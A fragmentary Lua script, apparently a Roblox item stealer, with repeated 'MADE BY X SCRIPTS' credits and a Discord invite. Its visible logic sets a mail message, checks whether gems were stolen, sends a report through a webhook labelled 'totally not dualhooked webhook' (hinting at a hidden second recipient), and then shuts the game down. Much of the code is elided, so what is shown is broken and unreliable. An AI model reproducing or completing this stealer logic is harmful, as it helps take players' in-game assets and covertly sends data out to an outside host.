...
MailMessage = "Egorikusa and Xorek_top are best"-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
    ...
    if BoothEnd == true and HoverEnd == true and FinalList == 0 then
        if GemsStolen == true then
            ...
            SendWebhook(
                ...
                "totally not dualhooked webhook"
            )
            wait(2)
            shutdowngame()
        end
